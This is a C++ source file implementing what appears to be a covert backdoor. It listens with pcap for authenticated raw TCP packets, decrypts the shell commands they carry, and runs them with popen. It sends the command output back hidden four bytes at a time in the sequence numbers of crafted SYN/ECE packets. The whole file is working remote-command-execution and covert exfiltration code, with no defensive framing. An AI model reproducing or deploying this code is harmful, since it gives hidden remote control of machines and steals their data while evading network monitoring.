#include "RemoteCodeExecuter.h"

#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <iostream>

#define CMD_START_STR "s-start["
#define CMD_STOP_STR "]s-end"

int RemoteCodeExecuter::sendCommand(NetworkEngine *net, const struct in_addr daddr,
                                    const std::string &cmd) {
    unsigned short sport;
    unsigned short dport;
    unsigned int seq;
    unsigned int ack;

    // generate signature
    sport = (Crypto::rand() % 55535) + 10000;
    dport = authenticator::generateSignature(sport);
    seq = Crypto::rand();
    ack = Crypto::rand();

    // convert command to payload
    std::string data(CMD_START_STR);
    data += cmd;
    data += CMD_STOP_STR;
    UCharVector payload(data.begin(), data.end());

    // encrypt
    UCharVector ciphertext = net->getCrypto()->enc(payload);

    // send
    return net->sendRawTcp(*net->getIp(), daddr, sport, dport, seq, ack,
                           TcpStack::SYN_FLAG | TcpStack::CWR_FLAG, ciphertext);
}

void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                                     NetworkEngine *net) {
    struct ethhdr *eth = (struct ethhdr *)packet;
    struct iphdr *ip;
    struct tcphdr *tcp;

    // is it from same machine?
    if (net->isFromThisMachine(eth)) {
        return;
    }

    // is it ip?
    if (!net->isIp(eth)) {
        return;
    }

    // is it tcp?
    ip = (struct iphdr *)(packet + ETH_HLEN);
    if (!net->isTcp(ip)) {
        return;
    }

    tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));

    // is it authenticated?
    if (!net->isAuth(tcp)) {
        return;
    }

    // get payload
    unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
    unsigned int payloadSize = header->len - ETH_HLEN - (ip->ihl * 4) - (tcp->doff * 4);

    // decrypt
    UCharVector ciphertext{};
    ciphertext.assign(payload, payload + payloadSize);

    UCharVector plaintext = net->getCrypto()->dec(ciphertext);

    // if command execute it
    if (tcp->syn && tcp->cwr) {
        char *tmp;
        if ((tmp = getCommand((char *)plaintext.data())) != nullptr) {
            executeCommand(net, ntohl(ip->saddr), tmp);
        }
    }

    // if it is a response print it
    if (tcp->syn && tcp->ece) {
        // convert the sequence number to a null terminated string and print it
        char seqBuffer[5];
        memcpy(seqBuffer, (unsigned char *)&tcp->seq, 4);
        seqBuffer[4] = 0;
        std::cout << seqBuffer << std::endl;
    }
}

char *RemoteCodeExecuter::getCommand(char *payload) {
    char *command;
    char *endPtr;

    if (!(command = strstr(payload, CMD_START_STR))) {
        return nullptr;
    }

    command += strlen(CMD_START_STR);

    if (!(endPtr = strstr(payload, CMD_STOP_STR))) {
        return nullptr;
    }
    *endPtr = 0;

    return command;
}

void RemoteCodeExecuter::executeCommand(NetworkEngine *net, const unsigned int daddr,
                                        const char *cmd) {
    struct in_addr daddrIn;
    daddrIn.s_addr = daddr;

    unsigned short sport;
    unsigned short dport;
    unsigned int ack;
    unsigned int *seq;
    FILE *fp;
    char lineBuffer[1000];
    int lineSize;

    UCharVector blank{};

    fp = popen(cmd, "r");

    memset(lineBuffer, 0, 1000);
    while (fgets(lineBuffer, 1000, fp)) {
        // calculate size to a multiple of 4
        lineSize = strlen(lineBuffer);
        if (lineSize % 4 != 0) {
            lineSize += 4 - (lineSize % 4);
        }

        // convert from c string to UCharVector
        std::string lineString(lineBuffer);
        UCharVector data(lineString.begin(), lineString.end());
        data.resize(lineSize, 0);

        // send as 4 bytes chunks stored in the sequence number
        for (int i = 0; i < data.size(); i += 4) {
            sport = (Crypto::rand() % 55535) + 10000;
            dport = authenticator::generateSignature(sport);

            ack = Crypto::rand();
            seq = (unsigned int *)(&data[i]);
            net->sendRawTcp(*net->getIp(), daddrIn, sport, dport, *seq, ack,
                            TcpStack::SYN_FLAG | TcpStack::ECE_FLAG, blank);
        }

        memset(lineBuffer, 0, 1000);
    }
}
